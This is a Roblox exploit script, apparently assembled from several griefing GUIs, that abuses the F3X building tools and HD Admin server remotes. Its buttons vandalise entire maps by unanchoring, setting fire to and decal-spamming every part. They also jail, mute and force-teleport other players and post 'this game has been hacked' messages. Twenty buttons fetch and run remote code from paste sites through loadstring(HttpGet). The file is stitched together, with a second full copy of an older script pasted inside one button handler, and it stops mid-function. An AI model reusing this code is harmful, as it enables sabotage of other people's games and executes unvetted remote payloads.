-- sunkun v1 - 终极完整版（包含所有功能整合）
-- 整合：Team N00K1A5K GUI + z00kiddl GUI + 新增8个功能

local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "sunkun_v1_ultimate"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player:WaitForChild("PlayerGui")

-- 主框架
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 600, 0, 750)
mainFrame.Position = UDim2.new(0.5, -300, 0.5, -375)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.BackgroundTransparency = 0.7
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local fc = Instance.new("UICorner")
fc.CornerRadius = UDim.new(0, 15)
fc.Parent = mainFrame

-- 标题
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.BackgroundTransparency = 1
title.Text = "SUNKUN v1 - ULTIMATE"
title.TextColor3 = Color3.fromRGB(0, 0, 0)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = mainFrame

-- 标签页框架
local tabFrame = Instance.new("Frame")
tabFrame.Size = UDim2.new(1, -20, 0, 40)
tabFrame.Position = UDim2.new(0, 10, 0, 70)
tabFrame.BackgroundTransparency = 1
tabFrame.Parent = mainFrame

-- 创建标签页按钮的函数
local function createTabButton(name, text, pos)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Text = text
    btn.Size = UDim2.new(0.23, 0, 1, 0)
    btn.Position = pos
    btn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.Parent = tabFrame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    return btn
end

local tabF3X = createTabButton("F3XTab", "F3X+HD功能", UDim2.new(0, 0, 0, 0))
local tabClient = createTabButton("ClientTab", "功能2", UDim2.new(0.24, 0, 0, 0))
local tabNew = createTabButton("NewTab", "新增功能", UDim2.new(0.48, 0, 0, 0))
local tabTeam = createTabButton("TeamTab", "Team GUI", UDim2.new(0.72, 0, 0, 0))

-- 滚动框架
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -20, 1, -120)
scrollFrame.Position = UDim2.new(0, 10, 0, 120)
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel = 0
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 3000)
scrollFrame.ScrollBarThickness = 8
scrollFrame.Visible = true
scrollFrame.Parent = mainFrame

local clientScroll = Instance.new("ScrollingFrame")
clientScroll.Size = UDim2.new(1, -20, 1, -120)
clientScroll.Position = UDim2.new(0, 10, 0, 120)
clientScroll.BackgroundTransparency = 1
clientScroll.BorderSizePixel = 0
clientScroll.CanvasSize = UDim2.new(0, 0, 0, 2500)
clientScroll.ScrollBarThickness = 8
clientScroll.Visible = false
clientScroll.Parent = mainFrame

local newScroll = Instance.new("ScrollingFrame")
newScroll.Size = UDim2.new(1, -20, 1, -120)
newScroll.Position = UDim2.new(0, 10, 0, 120)
newScroll.BackgroundTransparency = 1
newScroll.BorderSizePixel = 0
newScroll.CanvasSize = UDim2.new(0, 0, 0, 2000)
newScroll.ScrollBarThickness = 8
newScroll.Visible = false
newScroll.Parent = mainFrame

local teamScroll = Instance.new("ScrollingFrame")
teamScroll.Size = UDim2.new(1, -20, 1, -120)
teamScroll.Position = UDim2.new(0, 10, 0, 120)
teamScroll.BackgroundTransparency = 1
teamScroll.BorderSizePixel = 0
teamScroll.CanvasSize = UDim2.new(0, 0, 0, 2000)
teamScroll.ScrollBarThickness = 8
teamScroll.Visible = false
teamScroll.Parent = mainFrame

-- UI网格布局函数
local function setupGridLayout(frame)
    local uiGrid = Instance.new("UIGridLayout")
    uiGrid.CellSize = UDim2.new(0, 160, 0, 40)
    uiGrid.CellPadding = UDim2.new(0, 5, 0, 5)
    uiGrid.StartCorner = Enum.StartCorner.TopLeft
    uiGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
    uiGrid.Parent = frame
    return uiGrid
end

setupGridLayout(scrollFrame)
setupGridLayout(clientScroll)
setupGridLayout(newScroll)
setupGridLayout(teamScroll)

-- 通用按钮创建函数
local function makeBtn(parent, name, text)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Text = text
    btn.Size = UDim2.new(0, 160, 0, 40)
    btn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    btn.BorderSizePixel = 0
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255))
    }
    gradient.Parent = btn
    
    return btn
end

-- HD管理员命令函数
local function hdCommand(cmdStr)
    local rs = game:GetService("ReplicatedStorage")
    if rs:FindFirstChild("HDAdminHDClient") and rs.HDAdminHDClient.Signals:FindFirstChild("RequestCommandSilent") then
        rs.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(cmdStr)
    end
end

-- F3X工具获取函数
local function getSyncTool()
    local tool
    for _, v in pairs(player:GetDescendants()) do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
    if not tool then
        for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
            if v.Name == "SyncAPI" then
                tool = v.Parent
                break
            end
        end
    end
    return tool
end

local function runSync(args)
    local tool = getSyncTool()
    if tool and tool.SyncAPI and tool.SyncAPI.ServerEndpoint then
        tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
    end
end

-- ========== Team N00K1A5K GUI 功能整合 ==========

-- 1. get btools (给自己)
makeBtn(teamScroll, "GetBtools", "get btools").MouseButton1Click:Connect(function()
    hdCommand(";btools me")
end)

-- 2. sky (天空盒1)
makeBtn(teamScroll, "TeamSky1", "sky").MouseButton1Click:Connect(function()
    hdCommand(";time 0")
    hdCommand(";fogcolor black")
    wait(0.1)
    
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local e = root.CFrame.X
        local f = root.CFrame.Y
        local g = root.CFrame.Z
        runSync({"CreatePart", "Normal", CFrame.new(math.floor(e), math.floor(f), math.floor(g)) + Vector3.new(0,6,0), workspace})
        
        for _, v in game.Workspace:GetDescendants() do
            if v:IsA("BasePart") and math.floor(v.CFrame.X) == math.floor(e) and math.floor(v.CFrame.Z) == math.floor(g) then
                runSync({"SetName", {v}, "Sky"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://1118917027441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(99999,99999,99999)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
    end
    
    Sky("98869184805108")
end)

-- 3. decal spam (贴图垃圾邮件1)
makeBtn(teamScroll, "TeamDecalSpam1", "decal spam").MouseButton1Click:Connect(function()
    local function spam(id)
        for _, v in game.workspace:GetDescendants() do
            if v:IsA("BasePart") then
                task.spawn(function()
                    runSync({"SetLocked", {v}, false})
                    for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                        runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal"}}})
                        runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://"..id}}})
                    end
                end)
            end
        end
    end
    spam("98869184805108")
end)

-- 4. sky 2 (天空盒2)
makeBtn(teamScroll, "TeamSky2", "sky 2").MouseButton1Click:Connect(function()
    hdCommand(";time 0")
    hdCommand(";fogcolor black")
    wait(0.1)
    
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local e = root.CFrame.X
        local f = root.CFrame.Y
        local g = root.CFrame.Z
        runSync({"CreatePart", "Normal", CFrame.new(math.floor(e), math.floor(f), math.floor(g)) + Vector3.new(0,6,0), workspace})
        
        for _, v in game.Workspace:GetDescendants() do
            if v:IsA("BasePart") and math.floor(v.CFrame.X) == math.floor(e) and math.floor(v.CFrame.Z) == math.floor(g) then
                runSync({"SetName", {v}, "Sky"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://1118917041"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(99999,99999,99999)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
    end
    
    Sky("128609186391260")
end)

-- 5. decal spam 2 (贴图垃圾邮件2)
makeBtn(teamScroll, "TeamDecalSpam2", "decal spam 2").MouseButton1Click:Connect(function()
    local function spam(id)
        for _, v in game.workspace:GetDescendants() do
            if v:IsA("BasePart") then
                task.spawn(function()
                    runSync({"SetLocked", {v}, false})
                    for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                        runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal"}}})
                        runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://"..id}}})
                    end
                end)
            end
        end
    end
    spam("128609186391260")
end)

-- 6. colour spam (颜色垃圾邮件)
makeBtn(teamScroll, "TeamColorSpam", "colour spam").MouseButton1Click:Connect(function()
    for _, v in game.Workspace:GetDescendants() do
        if v:IsA("BasePart") then
            task.spawn(function()
                runSync({"SetLocked", {v}, false})
                runSync({"SyncColor", {{Part = v, Color = Color3.new(math.random(), math.random(), math.random()), UnionColoring = false}}})
            end)
        end
    end
end)

-- 7. texture spam (纹理垃圾邮件1)
makeBtn(teamScroll, "TeamTextureSpam1", "texture spam").MouseButton1Click:Connect(function()
    local function spam(id)
        for _, v in game.workspace:GetDescendants() do
            if v:IsA("BasePart") then
                task.spawn(function()
                    runSync({"SetLocked", {v}, false})
                    for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                        runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Texture"}}})
                        runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Texture", ["Texture"] = "rbxassetid://"..id}}})
                    end
                end)
            end
        end
    end
    spam("128609186391260")
end)

-- 8. texture spam 2 (纹理垃圾邮件2)
makeBtn(teamScroll, "TeamTextureSpam2", "texture spam 2").MouseButton1Click:Connect(function()
    local function spam(id)
        for _, v in game.workspace:GetDescendants() do
            if v:IsA("BasePart") then
                task.spawn(function()
                    runSync({"SetLocked", {v}, false})
                    for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                        runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Texture"}}})
                        runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Texture", ["Texture"] = "rbxassetid://"..id}}})
                    end
                end)
            end
        end
    end
    spam("1329872127404")
end)

-- 9. fire all (全图火焰)
makeBtn(teamScroll, "TeamFireAll", "fire all").MouseButton1Click:Connect(function()
    for _, v in game.Workspace:GetDescendants() do
        task.spawn(function()
            if v:IsA("BasePart") then
                runSync({"SetLocked", {v}, false})
                runSync({"CreateDecorations", {{["Part"] = v, ["DecorationType"] = "Fire"}}})
            end
        end)
    end
end)

-- 10. unanchor (解锚定)
makeBtn(teamScroll, "TeamUnanchor", "unanchor").MouseButton1Click:Connect(function()
    for _, v in game.Workspace:GetDescendants() do
        task.spawn(function()
            if v:IsA("BasePart") then
                runSync({"SetLocked", {v}, false})
                runSync({"SyncAnchor", {{Part = v, Anchored = false}}})
            end
        end)
    end
end)

-- 11. make baseplate (创建基板)
makeBtn(teamScroll, "TeamBaseplate", "make baseplate").MouseButton1Click:Connect(function()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local hrpx = math.floor(hrp.CFrame.X)
    local hrpz = math.floor(hrp.CFrame.Z)
    local hrpy = math.floor(hrp.CFrame.Y)
    
    runSync({"CreatePart", "Spawn", CFrame.new(hrpx, hrpy-20, hrpz), workspace})
    
    for _, v in game.Workspace:GetChildren() do
        if v:IsA("BasePart") and math.floor(v.CFrame.Y) == hrpy - 20 and math.floor(v.CFrame.X) == hrpx then
            task.spawn(function()
                runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(300, 2, 300)}}})
                runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(70,100,100), UnionColoring = false}}})
                runSync({"CreateTextures", {{["Part"] = v, ["Face"] = Enum.NormalId.Top, ["TextureType"] = "Texture"}}})
                runSync({"SyncTexture", {{["Part"] = v, ["Face"] = Enum.NormalId.Top, ["TextureType"] = "Texture", ["Texture"] = "rbxassetid://0", ["StudsPerTileV"] = 10, ["StudsPerTileU"] = 10}}})
                while wait(1) do
                    pcall(function() runSync({"SetLocked", {v}, true}) end)
                end
            end)
        end
    end
end)

-- 12. savemap (保存地图)
makeBtn(teamScroll, "TeamSavemap", "savemap").MouseButton1Click:Connect(function()
    hdCommand(";savemap")
end)

-- 13. Team's theme (团队主题音乐)
makeBtn(teamScroll, "TeamTheme", "Team's theme").MouseButton1Click:Connect(function()
    hdCommand(";music 1839246711")
    hdCommand(";pitch 0.8")
    hdCommand(";volume inf")
end)

-- 14. music (音乐)
makeBtn(teamScroll, "TeamMusic", "music").MouseButton1Click:Connect(function()
    hdCommand(";music 94625860335523")
    hdCommand(";pitch 1.1")
    hdCommand(";volume inf")
end)

-- 15. T00KSHAF1Y's theme (T00KSHAF1Y主题)
makeBtn(teamScroll, "TookshafiyTheme", "T00KSHAF1Y's theme").MouseButton1Click:Connect(function()
    hdCommand(";music 1847661821")
    hdCommand(";pitch 0.8")
    hdCommand(";volume inf")
end)

-- 16. tp all to meep city 4 (传送所有人到meep city 4)
makeBtn(teamScroll, "TeamTPMeepCity", "tp all to meep city 4").MouseButton1Click:Connect(function()
    hdCommand(";globalforceplace 1091473338213")
    hdCommand(";forceplace 1091473338213")
end)

-- 17. hint 2 (提示2)
makeBtn(teamScroll, "TeamHint2", "hint 2").MouseButton1Click:Connect(function()
    hdCommand(";shp Team N00K1A5K join now!!")
end)

-- 18. message (消息1)
makeBtn(teamScroll, "TeamMessage1", "message").MouseButton1Click:Connect(function()
    hdCommand(";mp this game has been hacked by team N00K1A5K")
end)

-- 19. message 2 (消息2)
makeBtn(teamScroll, "TeamMessage2", "message 2").MouseButton1Click:Connect(function()
    hdCommand(";mp Team N00K1A5K join today!!")
end)

-- 20. title me (给自己标题)
makeBtn(teamScroll, "TeamTitleMe", "title me").MouseButton1Click:Connect(function()
    hdCommand(";titlep me N00K1A5K")
end)

-- 21. jail all (监狱所有人)
makeBtn(teamScroll, "TeamJailAll", "jail all").MouseButton1Click:Connect(function()
    hdCommand(";freeze all ;disco ;fog")
end)

-- 22. anti skid (反脚本小子)
makeBtn(teamScroll, "TeamAntiSkid", "anti skid").MouseButton1Click:Connect(function()
    hdCommand(";mute others")
    hdCommand(";hidegui others")
end)

-- 23. name all (命名所有人)
makeBtn(teamScroll, "TeamNameAll", "name all").MouseButton1Click:Connect(function()
    hdCommand(";name all N00K1A5K")
end)

-- 24. unmute(uself) (解除自己静音)
makeBtn(teamScroll, "TeamUnmuteSelf", "unmute(uself)").MouseButton1Click:Connect(function()
    hdCommand(";unmute me")
    hdCommand(";showgui me")
end)

-- 25. Hack (黑客功能)
makeBtn(teamScroll, "TeamHack", "Hack").MouseButton1Click:Connect(function()
    hdCommand(";jail all")
end)

-- ========== z00kiddl GUI 功能整合 ==========

-- 左侧内部按钮
local z00LeftInsideURLs = {
    "https://pastefy.app/HWbdevXf/raw",
    "https://pastefy.app/tX6LiRoT/raw",
    "https://pastefy.app/XDc6yxTO/raw",
    "https://pastefy.app/le7UXaTo/raw",
    "https://pastefy.app/4YJtCIq9/raw",
    "https://rawscripts.net/raw/Universal-Script-Better-toad-rain-32545",
    "https://pastefy.app/L9ehHB3W/raw",
    "https://pastefy.app/rJFrDWWI/raw",
    "https://pastefy.app/yTP36ixZ/raw",
    "https://pastebin.com/raw/WneFn7Wv"
}

local z00LeftInsideNames = {"decal", "sky1", "sky2", "get btools", "particle", "toad rain", "fire all", "Avatar all", "spooky", "Thomas"}

for i = 1, 10 do
    makeBtn(clientScroll, "Z00Left"..i, z00LeftInsideNames[i]).MouseButton1Click:Connect(function()
        local url = z00LeftInsideURLs[i]
        pcall(function()
            loadstring(game:HttpGet(url))()
        end)
    end)
end

-- 右侧内部按钮
local z00RightInsideURLs = {
    "https://pastefy.app/6hQPrW8e/raw",
    "https://pastefy.app/WAIOwr8A/raw",
    "https://pastefy.app/SZ0ttPdX/raw",
    "https://pastefy.app/cBoe6d9s/raw",
    "https://pastefy.app/ucHp8ddg/raw",
    "https://pastefy.app/F7kBPz0g/raw",
    "https://pastefy.app/e76pHc5b/raw",
    "https://pastefy.app/25Wo75JN/raw",
    "https://pastefy.app/S2dvTTS6/raw",
    "https://pastefy.app/4LEdMVEk/raw"
}

local z00RightInsideNames = {"Rain troll", "message1", "message2", "title all", "audio1", "audio2", "audio3", "audio4", "decal scary2", "sky3"}

for i = 1, 10 do
    makeBtn(clientScroll, "Z00Right"..i, z00RightInsideNames[i]).MouseButton1Click:Connect(function()
        local url = z00RightInsideURLs[i]
        pcall(function()
            loadstring(game:HttpGet(url))()
        end)
    end)
end

-- ========== 原有F3X+HD功能 ==========

-- 1. 玩家模型循环变色 (修复版)
local colorChangeActive = false
local colorChangeThread

local function ColorChange()
    if colorChangeActive then
        colorChangeActive = false
        if colorChangeThread then
            coroutine.close(colorChangeThread)
        end
        hdCommand(";char all normal")
        return
    end
    
    colorChangeActive = true
    colorChangeThread = coroutine.create(function()
        while colorChangeActive do
            for _, color in pairs({
                Color3.fromRGB(255, 0, 0),
                Color3.fromRGB(0, 255, 0),
                Color3.fromRGB(0, 0, 255),
                Color3.fromRGB(255, 255, 0),
                Color3.fromRGB(255, 0, 255),
                Color3.fromRGB(0, 255, 255)
            }) do
                if not colorChangeActive then break end
                local r = math.floor(color.R * 255)
                local g = math.floor(color.G * 255)
                local b = math.floor(color.B * 255)
                hdCommand(";color all " .. r .. " " .. g .. " " .. b)
                task.wait(0.5)
            end
        end
    end)
    coroutine.resume(colorChangeThread)
end

-- 2. 全图旋转
local fullRotationActive = false
local fullRotationThread

local function FullRotation()
    if fullRotationActive then
        fullRotationActive = false
        if fullRotationThread then
            coroutine.close(fullRotationThread)
        end
        hdCommand(";freeze all")
        return
    end
    
    fullRotationActive = true
    fullRotationThread = coroutine.create(function()
        while fullRotationActive do
            hdCommand(";rotate all 360")
            task.wait(0.5)
        end
    end)
    coroutine.resume(fullRotationThread)
end

-- 3. 全图爆炸 (修复版)
local explosionActive = false
local explosionThread

local function FullExplosion()
    if explosionActive then
        explosionActive = false
        if explosionThread then
            coroutine.close(explosionThread)
        end
        return
    end
    
    explosionActive = true
    explosionThread = coroutine.create(function()
        while explosionActive do
            for _, plr in pairs(game.Players:GetPlayers()) do
                if plr.Character then
                    hdCommand(";explode " .. plr.Name)
                end
            end
            
            for i = 1, 10 do
                local randomPos = Vector3.new(
                    math.random(-200, 200),
                    math.random(0, 50),
                    math.random(-200, 200)
                )
                local explosion = Instance.new("Explosion")
                explosion.Position = randomPos
                explosion.BlastPressure = 1000000
                explosion.BlastRadius = 25
                explosion.Parent = workspace
                task.wait(0.1)
            end
            
            task.wait(2)
        end
    end)
    coroutine.resume(explosionThread)
end

-- 原有F3X+HD功能按钮
makeBtn(scrollFrame, "Hint", "提示").MouseButton1Click:Connect(function()
    hdCommand(";serverhint sunkun v1 已激活")
end)

makeBtn(scrollFrame, "Sky1", "天空盒1").MouseButton1Click:Connect(function()
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local cf = root.CFrame
        local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
        
        runSync({"CreatePart", "Normal", pos, workspace})
        task.wait(0.1)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                runSync({"SetName", {v}, "Skybox"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
        
        if game.Lighting:FindFirstChild("Sky") then
            game.Lighting.Sky:Destroy()
        end
    end
    
    Sky("106928937966054")
end)

-- ... 其他原有天空盒功能 ...

makeBtn(scrollFrame, "Disco", "迪斯科").MouseButton1Click:Connect(function()
    hdCommand(";disco")
end)

makeBtn(scrollFrame, "sunkun v1-1", "sunkun v1-1").MouseButton1Click:Connect(function()
    -- sunkun v1 - 完整版（新增6个功能）
-- F3X+HD区新增：变色、全图旋转、爆炸、下球雨、NPC、sunkun领域

local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "sunkun_v1"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player:WaitForChild("PlayerGui")

-- 主框架
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 550, 0, 700)
mainFrame.Position = UDim2.new(0.5, -275, 0.5, -350)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.BackgroundTransparency = 0.7
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local fc = Instance.new("UICorner")
fc.CornerRadius = UDim.new(0, 15)
fc.Parent = mainFrame

-- 标题
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.BackgroundTransparency = 1
title.Text = "SUNKUN v1"
title.TextColor3 = Color3.fromRGB(0, 0, 0)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = mainFrame

-- 标签页框架
local tabFrame = Instance.new("Frame")
tabFrame.Size = UDim2.new(1, -20, 0, 40)
tabFrame.Position = UDim2.new(0, 10, 0, 70)
tabFrame.BackgroundTransparency = 1
tabFrame.Parent = mainFrame

-- 创建标签页按钮的函数
local function createTabButton(name, text, pos)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Text = text
    btn.Size = UDim2.new(0.3, 0, 1, 0)
    btn.Position = pos
    btn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.Parent = tabFrame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    return btn
end

local tabF3X = createTabButton("F3XTab", "F3X+HD功能", UDim2.new(0, 0, 0, 0))
local tabClient = createTabButton("ClientTab", "本地客户端", UDim2.new(0.33, 0, 0, 0))
local tabNew = createTabButton("NewTab", "新增功能", UDim2.new(0.66, 0, 0, 0))

-- 滚动框架
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -20, 1, -120)
scrollFrame.Position = UDim2.new(0, 10, 0, 120)
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel = 0
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 2500)
scrollFrame.ScrollBarThickness = 8
scrollFrame.Visible = true
scrollFrame.Parent = mainFrame

local clientScroll = Instance.new("ScrollingFrame")
clientScroll.Size = UDim2.new(1, -20, 1, -120)
clientScroll.Position = UDim2.new(0, 10, 0, 120)
clientScroll.BackgroundTransparency = 1
clientScroll.BorderSizePixel = 0
clientScroll.CanvasSize = UDim2.new(0, 0, 0, 2000)
clientScroll.ScrollBarThickness = 8
clientScroll.Visible = false
clientScroll.Parent = mainFrame

local newScroll = Instance.new("ScrollingFrame")
newScroll.Size = UDim2.new(1, -20, 1, -120)
newScroll.Position = UDim2.new(0, 10, 0, 120)
newScroll.BackgroundTransparency = 1
newScroll.BorderSizePixel = 0
newScroll.CanvasSize = UDim2.new(0, 0, 0, 2000)
newScroll.ScrollBarThickness = 8
newScroll.Visible = false
newScroll.Parent = mainFrame

-- UI网格布局函数
local function setupGridLayout(frame)
    local uiGrid = Instance.new("UIGridLayout")
    uiGrid.CellSize = UDim2.new(0, 160, 0, 40)
    uiGrid.CellPadding = UDim2.new(0, 5, 0, 5)
    uiGrid.StartCorner = Enum.StartCorner.TopLeft
    uiGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
    uiGrid.Parent = frame
    return uiGrid
end

setupGridLayout(scrollFrame)
setupGridLayout(clientScroll)
setupGridLayout(newScroll)

-- 通用按钮创建函数
local function makeBtn(parent, name, text)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Text = text
    btn.Size = UDim2.new(0, 160, 0, 40)
    btn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    btn.BorderSizePixel = 0
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255))
    }
    gradient.Parent = btn
    
    return btn
end

-- HD管理员命令函数
local function hdCommand(cmdStr)
    local rs = game:GetService("ReplicatedStorage")
    if rs:FindFirstChild("HDAdminHDClient") and rs.HDAdminHDClient.Signals:FindFirstChild("RequestCommandSilent") then
        rs.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(cmdStr)
    end
end

-- F3X工具获取函数
local function getSyncTool()
    local tool
    for _, v in pairs(player:GetDescendants()) do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
    if not tool then
        for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
            if v.Name == "SyncAPI" then
                tool = v.Parent
                break
            end
        end
    end
    return tool
end

local function runSync(args)
    local tool = getSyncTool()
    if tool and tool.SyncAPI and tool.SyncAPI.ServerEndpoint then
        tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
    end
end

-- ========== 新增F3X+HD功能 ==========

-- 1. 玩家模型循环变色
local colorChangeActive = false
local colorChangeThread

local function ColorChange()
    if colorChangeActive then
        colorChangeActive = false
        if colorChangeThread then
            coroutine.close(colorChangeThread)
        end
        hdCommand(";char all normal")
        return
    end
    
    colorChangeActive = true
    colorChangeThread = coroutine.create(function()
        local colors = {
            Color3.fromRGB(255, 0, 0),   -- 红
            Color3.fromRGB(0, 255, 0),   -- 绿
            Color3.fromRGB(0, 0, 255),   -- 蓝
            Color3.fromRGB(255, 255, 0), -- 黄
            Color3.fromRGB(255, 0, 255), -- 紫
            Color3.fromRGB(0, 255, 255)  -- 青
        }
        
        while colorChangeActive do
            for _, color in pairs(colors) do
                if not colorChangeActive then break end
                
                -- 使用HD管理员改变所有玩家颜色
                local r = math.floor(color.R * 255)
                local g = math.floor(color.G * 255)
                local b = math.floor(color.B * 255)
                hdCommand(";color all " .. r .. " " .. g .. " " .. b)
                
                -- 使用F3X改变所有物体颜色
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") then
                        runSync({"SyncColor", {{Part = v, Color = color, UnionColoring = false}}})
                    end
                end
                
                task.wait(0.5)
            end
        end
    end)
    coroutine.resume(colorChangeThread)
end

-- 2. 全图旋转
local fullRotationActive = false
local fullRotationThread
local fullRotationParts = {}

local function FullRotation()
    if fullRotationActive then
        fullRotationActive = false
        if fullRotationThread then
            coroutine.close(fullRotationThread)
        end
        
        -- 恢复原始位置
        for _, data in pairs(fullRotationParts) do
            if data.part and data.part.Parent then
                data.part.CFrame = data.originalCF
            end
        end
        fullRotationParts = {}
        return
    end
    
    fullRotationActive = true
    
    -- 收集所有可旋转的部件
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name ~= "Terrain" and obj.Name ~= "Skybox" then
            table.insert(fullRotationParts, {
                part = obj,
                originalCF = obj.CFrame,
                rotationSpeed = math.random(1, 5)
            })
        end
    end
    
    fullRotationThread = coroutine.create(function()
        while fullRotationActive do
            for _, data in pairs(fullRotationParts) do
                if data.part and data.part.Parent then
                    -- 使用F3X旋转部件
                    local newCF = data.part.CFrame * CFrame.Angles(
                        0,
                        math.rad(data.rotationSpeed * 5),
                        0
                    )
                    runSync({"SyncMove", {{Part = data.part, CFrame = newCF}}})
                end
            end
